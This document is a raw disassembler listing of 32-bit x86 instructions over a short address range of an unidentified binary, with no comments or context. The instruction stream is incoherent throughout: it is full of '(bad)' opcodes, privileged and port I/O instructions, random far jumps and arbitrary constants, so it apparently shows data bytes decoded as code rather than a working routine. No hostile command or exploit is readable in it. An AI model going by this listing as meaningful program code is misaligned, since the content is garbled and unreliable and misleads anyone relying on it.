  41ed46:	dec    edi
  41ed47:	adc    al,0xb4
  41ed49:	jmp    0x41ece9
  41ed4b:	sbb    al,0x7f
  41ed4d:	hlt    
  41ed4e:	inc    ebp
  41ed4f:	sbb    ebx,ebp
  41ed51:	gs pop ss
  41ed53:	jb     0x41edbe
  41ed55:	add    al,0xb6
  41ed57:	dec    edx
  41ed58:	pop    esi
  41ed59:	mov    ds:0x67193922,al
  41ed5e:	dec    esp
  41ed5f:	cmp    eax,0x7b2ba325
  41ed64:	lock test DWORD PTR [eax+0x5504ebd3],esp
  41ed6b:	or     al,0x82
  41ed6d:	loopne 0x41ed05
  41ed6f:	sub    ebp,DWORD PTR [eax]
  41ed71:	imul   ebp,DWORD PTR ds:0xb0dc17ad,0xb09830b7
  41ed7b:	pushf  
  41ed7c:	(bad)  
  41ed7d:	fwait
  41ed7e:	push   esi
  41ed7f:	pop    ebp
  41ed80:	and    esp,DWORD PTR [ebx-0x2bcdd546]
  41ed86:	add    BYTE PTR [ebp+0x5266cfe],cl
  41ed8c:	(bad)  
  41ed8d:	adc    eax,0x5c322712
  41ed92:	idiv   dh
  41ed94:	mov    eax,ds:0x3c923d53
  41ed99:	jg     0x41ed81
  41ed9b:	mov    eax,ds:0xd1ec7df
  41eda0:	cld    
  41eda1:	cmp    eax,0xdbc7f8ac
  41eda6:	enter  0x86e2,0x70
  41edaa:	ret    0x176e
  41edad:	fcomp  st(1)
  41edaf:	fstp   QWORD PTR [ecx-0x6824c9ad]
	...
  41ee15:	add    BYTE PTR ds:0x7b197956,al
  41ee1b:	aas    
  41ee1c:	gs pop esi
  41ee1e:	mov    ds:0x2175b0a2,al
  41ee23:	jne    0x41edce
  41ee25:	aas    
  41ee26:	and    BYTE PTR [edi+0x1],al
  41ee29:	add    BYTE PTR [edi],al
  41ee2b:	add    DWORD PTR [eax],eax
  41ee2d:	add    BYTE PTR [edx+0x25501a3c],al
  41ee33:	imul   ebp,DWORD PTR [eax+0x66],0x9700a71b
  41ee3a:	mov    ecx,DWORD PTR [ebx+0x350df47e]
  41ee40:	pop    esi
  41ee41:	ins    BYTE PTR es:[edi],dx
  41ee42:	pop    es
  41ee43:	mov    ebp,0x801fdf3a
  41ee48:	loopne 0x41ee1b
  41ee4a:	retf   
  41ee4b:	mov    BYTE PTR [ebx],cl
  41ee4d:	fisttp DWORD PTR [esi]
  41ee4f:	lods   al,BYTE PTR ds:[esi]
  41ee50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee51:	ret    
  41ee52:	mov    ebp,ecx
  41ee54:	pop    esi
  41ee55:	cdq    
  41ee56:	push   0x698f0521
  41ee5b:	in     al,0x15
  41ee5d:	xchg   DWORD PTR [eax+0x45],eax
  41ee60:	xor    al,0x23
  41ee62:	je     0x41ee80
  41ee64:	loop   0x41ee7d
  41ee66:	lods   al,BYTE PTR ds:[esi]
  41ee67:	retf   
  41ee68:	out    0x2d,eax
  41ee6a:	mov    bh,0x3a
  41ee6c:	addr16 sbb eax,0x1d8c9ec1
  41ee72:	sti    
  41ee73:	aaa    
  41ee74:	rcl    ch,1
  41ee76:	mov    esp,0xdacfb2f2
  41ee7b:	adc    eax,DWORD PTR [edi-0x71478978]
  41ee81:	(bad)  
  41ee82:	or     dl,BYTE PTR [ebx]
  41ee84:	ds data16 mov bl,0xae
  41ee88:	xor    BYTE PTR [ebx-0x57],dl
  41ee8b:	sbb    bh,BYTE PTR [ecx-0x28]
  41ee8e:	cmp    al,0x61
  41ee90:	pop    ds
  41ee91:	dec    eax
  41ee92:	cmp    bh,cl
  41ee94:	in     al,0x91
  41ee96:	dec    ebp
  41ee97:	popa   
  41ee98:	cld    
  41ee99:	sub    BYTE PTR [edx],dl
  41ee9b:	adc    DWORD PTR [edx+0x5cf5f184],esp
  41eea1:	inc    ebp
  41eea2:	xor    DWORD PTR [edx+ebx*2],edx
  41eea5:	popf   
  41eea6:	adc    BYTE PTR [edx],bh
  41eea8:	mov    ds:0x673746d8,eax
  41eead:	test   BYTE PTR [ebx-0x7be3dfc0],cl
  41eeb3:	aas    
  41eeb4:	clc    
  41eeb5:	call   0x7c21dc55
  41eeba:	sub    eax,0x6e9c6f83
  41eebf:	jg     0x41eeba
  41eec1:	xor    al,0x3
  41eec3:	ins    DWORD PTR es:[edi],dx
  41eec4:	inc    ecx
  41eec5:	imul   ebx,DWORD PTR [ecx+eax*2+0x69cf33cd],0x9
  41eecd:	xor    eax,0xdde4950f
  41eed2:	repz jp 0x41ee91
  41eed5:	fiadd  WORD PTR ds:0x35e5c329
  41eedb:	push   ss
  41eedc:	pop    ecx
  41eedd:	ss sub eax,0x864cb340
  41eee3:	sub    BYTE PTR [esi+ebx*1+0x6d],al
  41eee7:	sub    DWORD PTR [ecx],esi
  41eee9:	test   BYTE PTR ds:0x4b4f48a7,al
  41eeef:	pop    eax
  41eef0:	xchg   dl,al
  41eef2:	add    eax,0x27e0fc02
  41eef7:	xchg   ecx,eax
  41eef8:	sub    DWORD PTR [esi-0x4e],ebp
  41eefb:	outs   dx,BYTE PTR ds:[esi]
  41eefc:	clc    
  41eefd:	rol    ebp,1
  41eeff:	lahf   
  41ef00:	push   ebx
  41ef01:	in     al,0x38
  41ef03:	pushf  
  41ef04:	cmp    BYTE PTR [esi+0x22],0x1b
  41ef08:	mov    BYTE PTR [edi],ch
  41ef0a:	mov    ebp,0x949dbdbf
  41ef0f:	cdq    
  41ef10:	not    ecx
  41ef12:	xchg   edx,eax
  41ef13:	(bad)  
  41ef14:	mov    al,0x94
  41ef16:	add    eax,0x98bab2ae
  41ef1b:	xchg   esi,ecx
  41ef1d:	(bad)  
  41ef1e:	arpl   WORD PTR [edi+0x50c7d074],bp
  41ef24:	pop    esp
  41ef25:	mov    esi,0xe4e2a157
  41ef2a:	and    al,0x90
  41ef2c:	or     BYTE PTR [edx+0x34442f92],0x90
  41ef33:	stos   BYTE PTR es:[edi],al
  41ef34:	sub    al,0x0
	...
  41ef96:	mov    ecx,0xff25bf5d
  41ef9b:	out    0xbb,eax
  41ef9d:	fnstsw WORD PTR [eax+0x76fceb38]
  41efa3:	outs   dx,DWORD PTR ds:[esi]
  41efa4:	mov    ecx,0x1482732
  41efa9:	add    BYTE PTR [edi],al
  41efab:	add    DWORD PTR [eax],eax
  41efad:	add    BYTE PTR [eax-0x3c4f5036],ah
  41efb3:	rol    bh,cl
  41efb5:	ret    0xa417
  41efb8:	cmp    ah,al
  41efba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41efbb:	call   0xafbb:0x6261c0d0
  41efc2:	clc    
  41efc3:	inc    ebp
  41efc4:	gs ins DWORD PTR es:[edi],dx
  41efc6:	imul   eax,DWORD PTR [edi],0x31
  41efc9:	mov    cl,0xdf
  41efcb:	test   ecx,edi
  41efcd:	ss loope 0x41efb1
  41efd0:	adc    eax,0x875025a
  41efd5:	mov    ebx,0xadd575be
  41efda:	test   BYTE PTR [ebx],bh
  41efdc:	push   eax
  41efdd:	mov    edx,0x824796f5
  41efe2:	push   0xfffffff5
  41efe4:	(bad)  
  41efe5:	jle    0x41eff6
  41efe7:	test   al,bh
  41efe9:	mov    dh,0x3c
  41efeb:	rcl    ebx,0x33
  41efee:	aam    0x48
  41eff0:	mov    eax,ds:0x82880418
  41eff5:	jecxz  0x41f03a
  41eff7:	imul   BYTE PTR [ecx]
  41eff9:	or     BYTE PTR [esi-0x3e],dl
  41effc:	xlat   BYTE PTR ds:[ebx]
  41effd:	fs inc edi
  41efff:	mov    ds:0x64ff559e,eax
  41f004:	aaa    
  41f005:	sti    
  41f006:	mov    esi,0x626fb94d
  41f00b:	mov    edx,0x86fde9ea
  41f010:	daa    
  41f011:	lock xchg ebx,eax
  41f013:	add    al,0xb6
  41f015:	or     esi,DWORD PTR [ecx]
  41f017:	jb     0x41ef9e
  41f019:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f01a:	xor    esi,esi
  41f01c:	call   0xd5356fe9
  41f021:	mov    ebx,0x543d39c1
  41f026:	xchg   esp,eax
  41f027:	aad    0x9c
  41f029:	adc    ch,BYTE PTR [ebx+ebp*4-0xb6b6ab]
  41f030:	mov    ds:0x87fe0820,eax
  41f035:	xor    DWORD PTR [esi+ebp*2],edx
  41f038:	or     eax,0x9d923869
  41f03d:	jl     0x41f058
  41f03f:	loope  0x41efe0
  41f041:	add    BYTE PTR [esi],bl
  41f043:	adc    ch,BYTE PTR [ebp+0x2846aa00]
  41f049:	add    DWORD PTR [edi-0x1a6ac58b],edi
  41f04f:	mov    esi,0x483b2a28
  41f054:	sbb    eax,0x251e9f8e
  41f059:	pop    esp
  41f05a:	in     al,dx
  41f05b:	mov    ebx,0x94c9ba80
  41f060:	outs   dx,DWORD PTR ds:[esi]
  41f061:	and    BYTE PTR es:[esi+eiz*8],0x77
  41f066:	dec    edx
  41f067:	inc    edx
  41f068:	int    0x63
  41f06a:	into   
  41f06b:	pop    ds
  41f06c:	pop    ebx
  41f06d:	repnz cmp DWORD PTR [ebp+0x64],esp
  41f071:	pop    esp
  41f072:	pop    esi
  41f073:	outs   dx,DWORD PTR ds:[esi]
  41f074:	int3   
  41f075:	into   
  41f076:	je     0x41f07e
  41f078:	mov    bl,ah
  41f07a:	cdq    
  41f07b:	and    esi,DWORD PTR [esi-0x10]
  41f07e:	cmp    edi,DWORD PTR [esi-0x32]
  41f081:	dec    eax
  41f082:	xchg   edi,eax
  41f083:	imul   ecx,DWORD PTR [edi+eax*2+0x6a0ab8e2],0x3f0c50e0
  41f08e:	push   esi
  41f08f:	jge    0x41f092
  41f091:	cdq    
  41f092:	test   BYTE PTR [esi],0xe3
  41f095:	(bad)  
  41f097:	int3   
  41f098:	sti    
  41f099:	add    DWORD PTR [ebp-0x2c58b0ad],esi
  41f09f:	cmp    al,0x40
  41f0a1:	outs   dx,DWORD PTR ds:[esi]
  41f0a2:	js     0x41f0b8
  41f0a4:	pushf  
  41f0a5:	retf   0x2219
  41f0a8:	int3   
  41f0a9:	push   es
  41f0aa:	push   0xc182fc31
  41f0af:	leave  
  41f0b0:	mov    esi,0xad490259
	...
  41f115:	add    BYTE PTR [ebx+0x6c2a6cdf],bl
  41f11b:	mov    ebx,0x6df0ffdf
  41f120:	sub    dh,BYTE PTR [ecx-0x65dbf2f1]
  41f126:	cs dec ecx
  41f128:	add    DWORD PTR [eax],eax
  41f12a:	pop    es
  41f12b:	add    DWORD PTR [eax],eax
  41f12d:	add    BYTE PTR [ecx-0x62a0d406],cl
  41f133:	icebp  
  41f134:	outs   dx,DWORD PTR ds:[esi]
  41f135:	mov    ebp,0xcbf23137
  41f13a:	adc    eax,0xb9573be4
  41f13f:	retf   
  41f140:	inc    BYTE PTR [edx-0x11f10154]
  41f146:	ss hlt 
  41f148:	jns    0x41f151
  41f14a:	jge    0x41f0fe
  41f14c:	retf   
  41f14d:	and    DWORD PTR [eax+edi*8],eax
  41f150:	nop
  41f151:	mov    ch,0x60
  41f153:	xchg   DWORD PTR [ecx+0x6e],ebp
  41f156:	cwde   
  41f157:	test   eax,ecx
  41f159:	imul   ebp,DWORD PTR [ecx+0x119de08d],0xca9f1937
  41f163:	jmp    0xab7e849b
  41f168:	pusha  
  41f169:	out    0xb,eax
  41f16b:	(bad)  
  41f16d:	dec    ebx
  41f16e:	outs   dx,DWORD PTR ds:[esi]
  41f16f:	add    BYTE PTR [ebp+edx*8+0x1c],ah
  41f173:	(bad)  
  41f174:	iret   
  41f175:	loop   0x41f107
  41f177:	fisub  DWORD PTR [ecx]
  41f179:	jmp    0xa6f8:0x318df8c7
  41f180:	sbb    eax,0xf85740a5
  41f185:	add    esi,esp
  41f187:	repnz icebp 
  41f189:	jnp    0x41f1c3
  41f18b:	cmp    dh,cl
  41f18d:	xchg   esi,eax
  41f18e:	dec    DWORD PTR [ecx-0x30d2fea3]
  41f194:	pop    es
  41f195:	frstor [edx]
  41f197:	xor    al,BYTE PTR [ebx+0x64]
  41f19a:	pop    eax
  41f19b:	mov    al,ds:0xd561068f
  41f1a0:	mov    eax,ds:0x798ae424
  41f1a5:	nop
  41f1a6:	repnz add al,0xaa
  41f1a9:	in     eax,dx
  41f1aa:	and    BYTE PTR [ebx+0x583b854b],al
  41f1b0:	call   0x5614:0xb0f42048
  41f1b7:	ds fwait
  41f1b9:	popa   
  41f1ba:	add    al,0x10
  41f1bc:	xor    ebx,DWORD PTR [eax+edi*2]
  41f1bf:	sbb    eax,0xfa92d1ee
  41f1c4:	imul   edx,ecx,0x1d
  41f1c7:	retf   
  41f1c8:	push   ds
  41f1c9:	mov    BYTE PTR [edi+edx*2+0x29cd473a],bh
  41f1d0:	sahf   
  41f1d1:	inc    esi
  41f1d2:	cmp    DWORD PTR [ecx+0x15],ecx
  41f1d5:	sub    al,0x37
  41f1d7:	jmp    0xfcc2:0x39ea622d
  41f1de:	pop    esp
  41f1df:	and    al,0x58
  41f1e1:	push   esi
  41f1e2:	aam    0xad
  41f1e4:	push   edi
  41f1e5:	and    edi,edi
  41f1e7:	loop   0x41f1ce
  41f1e9:	sub    bh,BYTE PTR [ebx]
  41f1eb:	int    0xea
  41f1ed:	ror    DWORD PTR [ecx-0x62b62000],1
  41f1f3:	pop    ds
  41f1f4:	jnp    0x41f190
  41f1f6:	out    dx,al
  41f1f7:	xchg   ecx,eax
  41f1f8:	dec    esi
  41f1f9:	fist   DWORD PTR [eax]
  41f1fb:	mov    ds:0x102f829,eax
  41f200:	sub    ch,0xf8
  41f203:	loopne 0x41f1e5
  41f205:	pop    edi
  41f206:	dec    ecx
  41f207:	pop    ss
  41f208:	jge    0x41f22b
  41f20a:	gs mov dh,0xcf
  41f20d:	xor    al,BYTE PTR [edi-0x61]
  41f210:	push   cs
  41f211:	ins    DWORD PTR es:[edi],dx
  41f212:	test   DWORD PTR [eax+0x605ca302],edx
  41f218:	fcmove st,st(4)
  41f21a:	push   es
  41f21b:	imul   ebp,edi,0x73
  41f21e:	cli    
  41f21f:	mov    ebp,0xae2904aa
  41f224:	ror    DWORD PTR [esi+0x7c],cl
  41f227:	mov    dl,0xbf
  41f229:	cmc    
  41f22a:	push   ecx
  41f22b:	fild   QWORD PTR [eax-0x2b80466b]
  41f231:	aas    
  41f232:	les    eax,FWORD PTR [eax-0x27]
	...
  41f295:	add    BYTE PTR [ecx+0x1b],dl
  41f298:	jmp    DWORD PTR [esi-0x1]
  41f29b:	out    0xd9,al
  41f29d:	aas    
  41f29e:	push   eax
  41f29f:	xor    DWORD PTR [edi-0x14],ebx
  41f2a2:	xchg   esp,eax
  41f2a3:	mov    esi,eax
  41f2a5:	jno    0x41f2dc
  41f2a7:	dec    edx
  41f2a8:	add    DWORD PTR [eax],eax
  41f2aa:	pop    es
  41f2ab:	add    DWORD PTR [eax],eax
  41f2ad:	add    BYTE PTR [ecx],ah
  41f2af:	pop    ebp
  41f2b0:	fucomip st,st(1)
  41f2b2:	dec    edi
  41f2b3:	neg    DWORD PTR [esi+0x524d0e1f]
  41f2b9:	mov    edx,DWORD PTR [edx-0x31]
  41f2bc:	retf   
  41f2bd:	fimul  WORD PTR [edi+0x5107f887]
  41f2c3:	jmp    0xfc4f:0x9a6966f2
  41f2ca:	aad    0x2d
  41f2cc:	and    BYTE PTR [edi+eiz*1],dl
  41f2cf:	std    
  41f2d0:	adc    BYTE PTR [edi],0x73
  41f2d3:	mov    al,ds:0x6f5a466d
  41f2d8:	pop    ebp
  41f2d9:	les    esi,FWORD PTR [ebp+ecx*1-0x2571f2d]
  41f2e0:	repz or ebx,DWORD PTR [ebx-0x274814c3]
  41f2e7:	inc    esi
  41f2e8:	jecxz  0x41f34d
  41f2ea:	adc    edi,ebx
  41f2ec:	mov    DWORD PTR [edi],0xef31c5c2
  41f2f2:	adc    al,0xd
  41f2f4:	cmp    esi,edx
  41f2f6:	fsub   QWORD PTR [eax]
  41f2f8:	leave  
  41f2f9:	mov    cl,BYTE PTR [eax-0x4b7e0d3a]
  41f2ff:	call   0xf5e2:0xea8cecfb
  41f306:	faddp  st(0),st
  41f308:	push   cs
  41f309:	push   cs
  41f30a:	jg     0x41f2c9
  41f30c:	shr    BYTE PTR [esi+0xd977c7c],1
  41f312:	sub    al,0x7b
  41f314:	leave  
  41f315:	lds    edi,FWORD PTR [edi]
  41f317:	add    DWORD PTR [ecx],ecx
  41f319:	aam    0xe
  41f31b:	call   0x9e48:0x53f2a03
  41f322:	dec    eax
  41f323:	outs   dx,BYTE PTR ds:[esi]
  41f324:	mov    dl,0x22
  41f326:	adc    eax,0xc2922232
  41f32b:	add    esi,DWORD PTR [eax]
  41f32d:	cmp    edx,edx
  41f32f:	adc    BYTE PTR [eax-0x1750706e],cl
  41f335:	cmp    BYTE PTR [edi],0xbe
  41f338:	ret    
  41f339:	or     BYTE PTR [edx+0x58],0xd9
  41f33d:	adc    eax,0x4392e214
  41f342:	aas    
  41f343:	ds and ebx,ebx
  41f346:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f347:	sub    ecx,DWORD PTR [edx-0x3]
  41f34a:	outs   dx,DWORD PTR ds:[esi]
  41f34b:	push   0xb1972820
  41f350:	scas   al,BYTE PTR es:[edi]
  41f351:	bndstx ds:0x594c98d2,bnd1
  41f358:	lods   eax,DWORD PTR ds:[esi]
  41f359:	and    DWORD PTR [eax],ebp
  41f35b:	das    
  41f35c:	jae    0x41f3c4
  41f35e:	adc    ebx,DWORD PTR [ebp-0x42ae3928]
  41f364:	sbb    BYTE PTR [edi-0x261458e],0xe2
  41f36b:	xchg   ebp,eax
  41f36c:	mov    BYTE PTR [edi],0xc9
  41f36f:	jmp    0x41f3b5
  41f371:	xchg   DWORD PTR [esi-0x7e8fddff],esi
  41f377:	test   BYTE PTR [eax],ah
  41f379:	ror    BYTE PTR [edi],cl
  41f37b:	imul   edi,ebp,0xb28751cd
  41f381:	arpl   WORD PTR [edi-0xb],bp
  41f384:	push   ss
  41f385:	sbb    cl,ah
  41f387:	ret    
  41f388:	adc    al,0x1f
  41f38a:	fucomi st,st(2)
  41f38c:	stos   WORD PTR es:[edi],ax
  41f38e:	push   edi
  41f38f:	stos   BYTE PTR es:[edi],al
  41f390:	jb     0x41f352
  41f392:	push   edi
  41f393:	xor    eax,0xd1c4a2d8
  41f398:	and    BYTE PTR [edx+0x75],0x9c
  41f39c:	inc    edi
  41f39d:	mov    edi,0x9702c45a
  41f3a2:	mov    dh,0x4
  41f3a4:	loop   0x41f332
  41f3a6:	mov    ds:0xacf79a80,eax
  41f3ab:	pop    ds
  41f3ac:	xchg   BYTE PTR [ecx],ah
  41f3ae:	dec    edi
  41f3af:	adc    eax,0xeb077852
  41f3b4:	add    DWORD PTR [eax],eax
	...
  41f416:	cmp    al,0xe7
  41f418:	imul   ebp,edi,0xfffffffb
  41f41b:	out    dx,eax
  41f41c:	mov    esp,0xc961c5f7
  41f421:	xchg   edx,eax
  41f422:	mov    dh,0xc3
  41f424:	inc    edi
  41f425:	push   0x3c
  41f427:	dec    ebx
  41f428:	add    DWORD PTR [eax],eax
  41f42a:	pop    es
  41f42b:	add    DWORD PTR [eax],eax
  41f42d:	add    BYTE PTR [edx-0x5b],ch
  41f430:	sbb    ecx,ebx
  41f432:	jecxz  0x41f3fb
  41f434:	mov    esi,0x2ba121aa
  41f439:	in     eax,dx
  41f43a:	adc    DWORD PTR [ecx+0x56],ebp
  41f43d:	xor    eax,0xa54e981e
  41f442:	outs   dx,BYTE PTR ds:[esi]
  41f443:	sar    BYTE PTR [edi+0x5b07d93c],cl
  41f449:	outs   dx,DWORD PTR ds:[esi]
  41f44a:	xchg   edi,eax
  41f44b:	in     eax,0x76
  41f44d:	xor    al,0x69
  41f44f:	inc    BYTE PTR [ecx]
  41f451:	dec    edi
  41f452:	pop    esi
  41f453:	(bad)  
  41f454:	sbb    eax,0xae30864d
  41f459:	loopne 0x41f405
  41f45b:	hlt    
  41f45c:	aam    0xf1
  41f45e:	rcr    BYTE PTR [esi],1
  41f460:	scas   eax,DWORD PTR es:[edi]
  41f461:	inc    edx
  41f462:	cmp    BYTE PTR [esp+ecx*8+0x2d657897],ah
  41f469:	jbe    0x41f47e
  41f46b:	popa   
  41f46c:	add    al,0x1c
  41f46e:	hlt    
  41f46f:	fwait
  41f470:	int    0xef
  41f472:	icebp  
  41f473:	(bad)  
  41f475:	jmp    0x41f417
  41f477:	dec    cl
  41f479:	mov    dl,0x75
  41f47b:	aam    0xfc
  41f47d:	sbb    al,0x8c
  41f47f:	mov    al,0x3
  41f481:	xchg   esp,eax
  41f482:	xchg   ebx,eax
  41f483:	pop    edi
  41f484:	xchg   edi,eax
  41f485:	lea    eax,[ebx]
  41f487:	retf   0x9de9
  41f48a:	xchg   edx,eax
  41f48b:	jge    0x41f48d
  41f48d:	cmp    al,0xcf
  41f48f:	jnp    0x41f46f
  41f491:	ins    BYTE PTR es:[edi],dx
  41f492:	jbe    0x41f4cb
  41f494:	cmp    al,0xae
  41f496:	and    ebx,ebx
  41f498:	and    bl,ch
  41f49a:	sub    BYTE PTR ds:[ebp+0x45d3b7cc],0xb3
  41f4a2:	inc    ebp
  41f4a3:	pop    ebx
  41f4a4:	test   al,0x3b
  41f4a6:	(bad)  
  41f4a7:	lock sbb eax,0xb019c24d
  41f4ad:	nop
  41f4ae:	fcmovnu st,st(0)
  41f4b0:	mov    WORD PTR [esi+esi*4],ds
  41f4b3:	xor    ecx,DWORD PTR [ebx-0x1d555691]
  41f4b9:	push   edx
  41f4ba:	int    0xcc
  41f4bc:	adc    al,0xeb
  41f4be:	jne    0x41f4fb
  41f4c0:	adc    al,BYTE PTR [eax+0x41]
  41f4c3:	(bad)  
  41f4c4:	push   ds
  41f4c5:	jle    0x41f483
  41f4c7:	cdq    
  41f4c8:	cs sub al,0x6b
  41f4cb:	xor    DWORD PTR [eax],esp
  41f4cd:	nop
  41f4ce:	mov    bh,0xb5
  41f4d0:	out    dx,eax
  41f4d1:	sub    eax,0x41174e53
  41f4d6:	call   DWORD PTR [ebx]
  41f4d8:	das    
  41f4d9:	sbb    DWORD PTR [ebp+edx*8-0x4],esp
  41f4dd:	push   es
  41f4de:	or     DWORD PTR [ecx],ecx
  41f4e0:	fwait
  41f4e1:	sub    BYTE PTR ds:0x4d794d78,ah
  41f4e7:	cmp    dh,0xc4
  41f4ea:	imul   edx,DWORD PTR [edx-0x4b9ddbb5],0xc394c85e
  41f4f4:	ins    DWORD PTR es:[edi],dx
  41f4f5:	loopne 0x41f56a
  41f4f7:	push   cs
  41f4f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4f9:	pushf  
  41f4fa:	push   esi
  41f4fb:	aaa    
  41f4fc:	pop    eax
  41f4fd:	xlat   BYTE PTR ds:[ebx]
  41f4fe:	(bad)  
  41f4ff:	jmp    0x17f5:0xa77d6f38
  41f506:	sub    ebx,DWORD PTR [eax-0x21]
  41f509:	push   ebp
  41f50a:	jmp    edx
  41f50c:	clc    
  41f50d:	pop    ds
  41f50e:	mov    bh,0x6a
  41f510:	mov    ah,0xa6
  41f512:	scas   al,BYTE PTR es:[edi]
  41f513:	ret    0xde8e
  41f516:	in     eax,dx
  41f517:	push   edx
  41f518:	out    0x94,al
  41f51a:	les    ebp,FWORD PTR [ecx+0x6f0d6bbf]
  41f520:	and    BYTE PTR [esi],0x9c
  41f523:	rcr    DWORD PTR [ebx],0x74
  41f526:	inc    edi
  41f527:	ss add bh,bh
  41f52a:	mov    ds:0x57ba7af8,eax
  41f52f:	inc    esi
  41f530:	mov    esi,0x9a3746f8
	...
  41f595:	add    BYTE PTR [eax+0x34],bh
  41f598:	add    bh,bl
  41f59a:	dec    esi
  41f59b:	(bad)  
  41f59c:	stc    
  41f59d:	mov    bh,0x14
  41f59f:	pop    ebp
  41f5a0:	sub    cl,ah
  41f5a2:	pop    ebx
  41f5a3:	cli    
  41f5a4:	sub    al,BYTE PTR [eax+0x14c43]
  41f5aa:	pop    es
  41f5ab:	add    DWORD PTR [eax],eax
  41f5ad:	add    BYTE PTR [ebp-0x7],cl
  41f5b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f5b1:	shr    BYTE PTR [edi-0x13],0x7f
  41f5b5:	(bad)  
  41f5b6:	adc    DWORD PTR [ecx-0xd0d1653],esp
  41f5bc:	jns    0x41f601
  41f5be:	fld    DWORD PTR [esi-0x72]
  41f5c1:	sbb    dl,BYTE PTR [eax+0x5b]
  41f5c4:	out    dx,al
  41f5c5:	idiv   ebp
  41f5c7:	adc    bh,BYTE PTR [ebx+eax*1]
  41f5ca:	fsub   st(4),st
  41f5cc:	mov    cl,0xfc
  41f5ce:	mov    dh,0x87
  41f5d0:	and    al,dl
  41f5d2:	sbb    BYTE PTR [eax-0x5f59970d],0x3f
  41f5d9:	push   edi
  41f5da:	pop    ss
  41f5db:	push   cs
  41f5dc:	enter  0x77bb,0x12
  41f5e0:	mov    edx,0x4bcb108
  41f5e5:	jecxz  0x41f5d8
  41f5e7:	and    eax,0xc73742bd
  41f5ec:	test   al,0x53
  41f5ee:	push   0xd4c5bd8c
  41f5f3:	push   0xb2188b94
  41f5f8:	and    DWORD PTR [edx],esi
  41f5fa:	cmc    
  41f5fb:	sar    DWORD PTR [eax],cl
  41f5fd:	seta   BYTE PTR [eax-0x1ee14b5]
  41f604:	sbb    esi,DWORD PTR [ebx]
  41f606:	sub    eax,0x8f21db7e
  41f60b:	(bad)  
  41f60c:	jmp    0x41f64f
  41f60e:	xchg   ebp,eax
  41f60f:	mov    al,0x63
  41f611:	mov    ecx,0x83ccf395
  41f616:	xchg   ebx,eax
  41f617:	inc    edx
  41f618:	mov    gs,WORD PTR [ebx]
  41f61a:	in     eax,0x34
  41f61c:	adc    eax,0x5226c136
  41f621:	sbb    eax,0xccafcd56
  41f626:	into   
  41f627:	int    0xe
  41f629:	and    ebp,ecx
  41f62b:	outs   dx,DWORD PTR ds:[esi]
  41f62c:	push   ss
  41f62d:	arpl   WORD PTR [esi+0x1f],dx
  41f630:	mov    cs,WORD PTR [ebp-0x33]
  41f633:	add    ecx,DWORD PTR [esi]
  41f635:	cmp    ebx,DWORD PTR [edx+0xd7b937e]
  41f63b:	xchg   edx,eax
  41f63c:	addr16 mov ebp,0xd8eeff63
  41f642:	mov    ?,WORD PTR [ebx+0xa]
  41f645:	je     0x41f64d
  41f647:	data16 mov al,bl
  41f64a:	sti    
  41f64b:	inc    esp
  41f64c:	inc    esi
  41f64d:	or     ebx,DWORD PTR [esi]
  41f64f:	fdivr  DWORD PTR [ebp-0x52]
  41f652:	cmp    al,0xf9
  41f654:	sub    eax,0x7f4e35c9
  41f659:	ret    
  41f65a:	bound  ebx,QWORD PTR [edx]
  41f65c:	mov    ss,WORD PTR [ecx+0x6e086684]
  41f662:	ss in  eax,dx
  41f664:	(bad)  
  41f665:	push   ebp
  41f666:	aas    
  41f667:	hlt    
  41f668:	in     eax,0x3f
  41f66a:	std    
  41f66b:	pop    ecx
  41f66c:	inc    eax
  41f66d:	cmp    DWORD PTR [ecx+0x38d71a2c],eax
  41f673:	aam    0x51
  41f675:	(bad)  
  41f676:	xor    BYTE PTR [ebp-0x2c33f185],al
  41f67c:	(bad)  
  41f67d:	mov    ch,0x51
  41f67f:	mov    edi,0xee2d45f9
  41f684:	loopne 0x41f646
  41f686:	in     eax,0x2
  41f688:	push   esi
  41f689:	inc    ebp
  41f68a:	xchg   esp,eax
  41f68b:	adc    eax,0xfd5c1d72
  41f690:	jmp    0x41f68c
  41f692:	ja     0x41f63c
  41f694:	pop    ss
  41f695:	mov    edx,0x19b381d2
  41f69a:	jbe    0x41f672
  41f69c:	stc    
  41f69d:	addr16 pop es
  41f69f:	sub    BYTE PTR ds:0xa9c8f5ca,bl
  41f6a5:	adc    ch,BYTE PTR ds:0xb272e0cb
  41f6ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f6ac:	cli    
  41f6ad:	ins    DWORD PTR es:[edi],dx
  41f6ae:	add    al,0x93
  41f6b0:	inc    eax
  41f6b1:	fcmovne st,st(5)
  41f6b3:	push   esp
  41f6b4:	stos   BYTE PTR es:[edi],al
	...
  41f715:	add    BYTE PTR [edx-0x5081dcc4],dl
  41f71b:	jg     0x41f6fc
  41f71d:	cld    
  41f71e:	dec    ecx
  41f71f:	loope  0x41f6f2
  41f721:	sbb    DWORD PTR [ebx+ebx*2+0x4d4aefc6],eax
  41f728:	add    DWORD PTR [eax],eax
  41f72a:	pop    es
  41f72b:	add    DWORD PTR [eax],eax
  41f72d:	add    BYTE PTR [ebx],ch
  41f72f:	jp     0x41f6b4
  41f731:	jecxz  0x41f6b7
  41f733:	or     ecx,DWORD PTR [esi-0x6d33fe33]
  41f739:	xor    al,0x8
  41f73b:	mov    ?,WORD PTR [ebx]
  41f73d:	test   DWORD PTR [eax+0x10441c7c],esi
  41f743:	push   ds
  41f744:	push   esi
  41f745:	or     al,0x95
  41f747:	es sbb al,0x5f
  41f74a:	inc    edx
  41f74b:	jne    0x41f7ab
  41f74d:	out    0x5c,al
  41f74f:	jle    0x41f76d
  41f751:	gs icebp 
  41f753:	mov    ds:0x6282c35d,eax
  41f758:	jns    0x41f6fc
  41f75a:	mov    ebx,DWORD PTR [eax]
  41f75c:	je     0x41f78d
  41f75e:	fist   WORD PTR [ebp-0x34]
  41f761:	dec    ecx
  41f762:	mov    ebx,0x1a64984d
  41f767:	jb     0x41f71b
  41f769:	lahf   
  41f76a:	cld    
  41f76b:	popa   
  41f76c:	aaa    
  41f76d:	lods   al,BYTE PTR ds:[esi]
  41f76e:	dec    ebp
  41f76f:	push   edi
  41f770:	ror    DWORD PTR [esi],cl
  41f772:	cmp    ah,BYTE PTR [ecx+esi*1-0x39]
